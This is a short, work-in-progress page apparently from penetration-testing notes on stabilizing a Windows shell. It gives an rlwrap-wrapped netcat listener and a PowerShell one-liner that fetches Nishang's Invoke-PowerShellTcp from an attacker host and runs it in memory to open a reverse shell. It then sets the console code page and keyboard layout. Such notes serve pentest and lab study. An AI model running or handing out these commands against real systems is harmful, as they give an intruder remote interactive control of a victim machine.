---
sidebar_position: 1
title: Terminal
description: Windows Shell Stabilization
keywords: [shell stabilization windows, rlwrap, metasploit shell stabilization]
---

:::caution Work In Progress

:::



```batch
:: In Windows we can use rlwrap before Connecting to the Target Machine
rlwrap nc -nvlp $PORT
```

```powershell
# After connecting to the Target we can Upload - Execute Invoke-PowerShellTcp [Nishang]
# [An interactive PowerShell Reverse Connect]
powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
```


## Interface

```batch
:: Enable Unicode Characters
chcp 65001

:: Set Keyboard Layout
Set-WinUserLanguageList -LanguageList us-US -force
```